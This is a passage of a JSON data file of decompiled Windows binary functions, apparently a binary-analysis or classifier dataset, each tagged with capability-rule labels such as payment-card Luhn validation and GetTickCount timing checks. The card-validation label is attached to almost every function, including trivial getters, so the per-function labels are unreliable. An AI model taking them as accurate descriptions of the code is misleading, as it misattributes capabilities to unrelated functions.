= (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453c10:\n        uVar4 = *(arg_8h + (arg_10h - 7));\n        uVar6 = *(arg_ch + (arg_10h - 7));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453cca:\n        iVar5 = *(arg_8h + (arg_10h - 3)) - *(arg_ch + (arg_10h - 3));\n        if ((iVar5 != 0) || (iVar5 = *(arg_8h + (arg_10h - 2)) - *(arg_ch + (arg_10h - 2)),  iVar5 != 0))\n        goto code_r0x00453ce6;\n        goto code_r0x00453269;\n    }\n}\n",
        "token_count": 14877
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    // [00] -r-x section size 471040 named .text\n    fcn.00402520();\n    fcn.0043a7a7(fcn.00473da0);\n    return;\n}\n",
        "token_count": 58
    },
    "00401100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401100(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[1] = NULL;\n    in_ECX[2] = NULL;\n    var_ch = arg_8h;\n    var_8h._0_1_ = 1;\n    fcn.004510c5(&var_ch, in_ECX + 1);\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 192
    },
    "00401380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401380(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00451500(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 51
    },
    "004013d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00451a80(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00401470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00401470(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_ch = *arg_ch + 0x23;\n    iVar1 = *(*arg_8h + -4);\n    uVar2 = *arg_8h - iVar1;\n    if ((uVar2 < 4) || (0x23 < uVar2)) {\n        fcn.004559ed(4);\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 173
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401740(uint *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_5ch;\n    uint var_30h;\n    uint var_4h;\n    \n    puVar1 = fcn.004257ac(&var_5ch);\n    puVar3 = &var_30h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    puVar1 = &var_30h;\n    puVar3 = arg_8h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 245
    },
    "00401b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401b10(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00452000();\n    return;\n}\n",
        "token_count": 38
    },
    "00402410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402410(int32_t arg_8h)\n\n{\n    return ((arg_8h + 2) - (arg_8h + 2U) % 3) / 3 << 2;\n}\n",
        "token_count": 55
    },
    "00402ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ed0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470230;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405100(var_10h);\n    fcn.00404d40(0x104, 0);\n    uVar1 = fcn.00404d90();\n    uVar3 = 0;\n    uVar2 = fcn.00404f00(0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetUserDefaultLocaleName)(uVar2, uVar3, uVar1);\n    fcn.00404d40(uVar1, 0);\n    uVar2 = fcn.00401440(&var_28h);\n    fcn.00405010(uVar2);\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(uVar1);\n    return;\n}\n",
        "token_count": 327
    },
    "00402f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f80(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_fffffef4;\n    uint *arg_8h_00;\n    uint arg_ch;\n    uint var_dch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uint var_4ch;\n    uchar var_32h;\n    uchar var_31h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470260;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_31h = 0;\n    var_32h = 0;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        fcn.00403140(&var_2ch, uVar2);\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            uVar2 = fcn.00401440(var_30h + 0x180);\n            arg_ch = 0;\n            uVar3 = fcn.00407c10(&var_4ch, &var_2ch, var_30h + 0x168);\n            uVar3 = fcn.00401440(uVar3);\n            fcn.00403210(uVar3, arg_ch, uVar2);\n            fcn.00404f30();\n            uVar2 = fcn.00403490(&var_dch);\n            arg_8h_00 = &var_c4h;\n            uVar2 = fcn.00403940(arg_8h_00, uVar2);\n            uVar3 = fcn.00407b00(&var_ach, var_30h + 0x18, 0x485a0c);\n            uVar2 = fcn.00407cd0(&var_94h, uVar3, uVar2);\n            uVar2 = fcn.00407bd0(&var_7ch, uVar2, arg_8h_00);\n            uVar2 = fcn.00401440(uVar2);\n            in_stack_fffffef4 = 1;\n            uVar3 = fcn.00407c10(&var_64h, &var_2ch, var_30h + 0x150);\n            uVar3 = fcn.00401440(uVar3);\n            fcn.00403210(uVar3, in_stack_fffffef4, uVar2);\n            fcn.00404f30();\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.00404f30();\n        }\n        fcn.00404f30();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_fffffef4);\n    return;\n}\n",
        "token_count": 776
    },
    "004032f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004032f0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x78;\n}\n",
        "token_count": 41
    },
    "00403310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403310(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x90;\n}\n",
        "token_count": 40
    },
    "00403330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403330(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xa8;\n}\n",
        "token_count": 40
    },
    "00403350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403350(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xc0;\n}\n",
        "token_count": 40
    },
    "00403370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403370(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xcc;\n}\n",
        "token_count": 39
    },
    "00403390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403390(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xd8;\n}\n",
        "token_count": 40
    },
    "004033b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004033b0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xe4;\n}\n",
        "token_count": 41
    },
    "004033d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004033d0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xf0;\n}\n",
        "token_count": 41
    },
    "004033f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004033f0(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0xfc;\n}\n",
        "token_count": 40
    },
    "00403410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403410(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x114;\n}\n",
        "token_count": 40
    },
    "00403430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403430(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x120;\n}\n",
        "token_count": 40
    },
    "00403450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403450(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x150;\n}\n",
        "token_count": 40
    },
    "00403470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403470(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x168;\n}\n",
        "token_count": 40
    },
    "004035a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035a0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4702c0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        fcn.00401b10(0x50);\n        fcn.00404170();\n        uVar2 = fcn.004040e0(&var_7ch, arg_ch);\n        uVar2 = fcn.00401440(uVar2);\n        fcn.00405010(uVar2);\n        fcn.00404f30();\n        fcn.00404130();\n    }\n    else {\n        uVar2 = fcn.00405100();\n        uVar2 = fcn.00401440(uVar2);\n        fcn.00405010(uVar2);\n        fcn.00404f30();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 379
    },
    "004037a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037a0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00404990();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        puVar3 = fcn.00404940(uVar2);\n        fcn.00407db0(*puVar3);\n    }\n    else {\n        uVar2 = fcn.00401440(arg_8h);\n        fcn.00403800(uVar2);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00403800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00403800(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint noname_0;\n    int32_t *piVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    puVar2 = fcn.00404940();\n    uVar3 = fcn.00401440(*puVar2);\n    noname_0 = fcn.00404960();\n    fcn.00407d80(noname_0, uVar3, uVar1);\n    puVar2 = fcn.00404940();\n    uVar1 = *puVar2;\n    puVar2 = fcn.00404940(uVar1);\n    uVar3 = *puVar2;\n    fcn.00404980(uVar3);\n    puVar2 = fcn.00404940();\n    piVar4 = fcn.00404940(uVar3, uVar1, *puVar2);\n    *piVar4 = *piVar4 + 0x18;\n    return;\n}\n",
        "token_count": 278
    },
    "00403890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403890(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_7ch;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470320;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        fcn.00401b10(0x50);\n        fcn.00404170();\n        uVar2 = fcn.004040e0(&var_7ch, arg_ch);\n        uVar2 = fcn.00401440(uVar2);\n        fcn.00405010(uVar2);\n        fcn.00404f30();\n        fcn.00404130();\n    }\n    else {\n        fcn.00405090(0x485a10);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 336
    },
    "00403a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403a10(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    fcn.00404f30();\n    fcn.004055f0();\n    fcn.00401990();\n    return;\n}\n",
        "token_count": 108
    },
    "004040e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004040e0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00405220();\n    iVar1 = fcn.00404d90();\n    fcn.00405ce0(arg_8h, arg_ch_00, iVar1 + arg_ch_00);\n    return arg_8h;\n}\n",
        "token_count": 117
    },
    "00404130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404130(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_utf16_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    fcn.00404f30();\n    fcn.004055f0();\n    fcn.00401990();\n    return;\n}\n",
        "token_count": 109
    },
    "00404940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.00404940(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00404960(param_1);\n    return iVar1 + 4;\n}\n",
        "token_count": 72
    },
    "00404a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a10(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    fcn.00407f90(uVar2);\n    uVar2 = fcn.00401440(arg_8h);\n    fcn.00406080(uVar2);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 216
    },
    "00404c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c90(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_18h;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch_00;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4703d0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00404960(uVar1);\n    arg_18h = fcn.00407260(arg_8h);\n    arg_ch_00 = *(iVar2 + 0x10);\n    arg_8h_00 = fcn.00406170();\n    fcn.00407fc0(arg_8h_00, arg_ch_00, arg_ch, arg_8h, arg_18h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 269
    },
    "00404e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404e00(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    ushort var_4h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    uVar1 = *(iVar2 + 0x10);\n    if (uVar1 < *(iVar2 + 0x14)) {\n        *(iVar2 + 0x10) = uVar1 + 1;\n        iVar2 = fcn.00406170();\n        fcn.00407220(iVar2 + uVar1 * 2, &arg_8h);\n        var_4h = 0;\n        fcn.00407220(iVar2 + 2 + uVar1 * 2, &var_4h);\n    }\n    else {\n        var_1h._0_1_ = 0;\n        fcn.00408120(1, 0, arg_8h & 0xffff);\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00404ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404ea0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_10h);\n    fcn.00407220(arg_8h + arg_10h * 2, &arg_14h);\n    var_2h._0_2_ = 0;\n    fcn.00407220(arg_8h + 2 + arg_10h * 2, &var_2h);\n    return;\n}\n",
        "token_count": 172
    },
    "00404f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404f80(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00401440(arg_8h);\n    if (in_ECX != iVar2) {\n        fcn.00406350(uVar1);\n        uVar3 = fcn.00404960();\n        fcn.004061b0(uVar3);\n        uVar3 = fcn.00401440(arg_8h);\n        fcn.00406770(uVar3);\n    }\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 248
    },
    "00405010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405010(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    fcn.00408270(uVar2);\n    uVar2 = fcn.00401440(arg_8h);\n    fcn.004066d0(uVar2);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 215
    },
    "00405150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405150(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch_00;\n    uint arg_18h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4703d0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00404960(uVar1);\n    iVar3 = fcn.00404960();\n    arg_18h = *(iVar3 + 0x10);\n    arg_14h = fcn.004062c0();\n    arg_ch_00 = *(iVar2 + 0x10);\n    arg_8h_00 = fcn.004062c0();\n    fcn.004082a0(arg_8h_00, arg_ch_00, arg_ch, arg_14h, arg_18h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 313
    },
    "00405270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00405270(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404960();\n    iVar2 = fcn.004062c0(uVar1);\n    return iVar2 + arg_8h;\n}\n",
        "token_count": 103
    },
    "004052a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004052a0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    uVar3 = fcn.004062c0();\n    uVar3 = fcn.00401440(uVar3);\n    fcn.00406140(uVar3, uVar2);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 228
    },
    "00405350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
